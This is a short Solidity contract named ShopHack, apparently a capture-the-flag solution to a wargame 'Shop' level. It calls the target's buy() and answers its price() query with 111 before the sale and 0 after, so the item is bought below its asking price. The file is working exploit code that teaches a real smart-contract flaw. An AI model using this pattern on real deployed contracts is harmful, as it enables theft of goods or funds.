// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Shop} from "./Shop.sol";

contract ShopHack {
    Shop private target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
    }

    function price() external view returns (uint256) {
        return target.isSold() ? 0 : 111;
    }
}
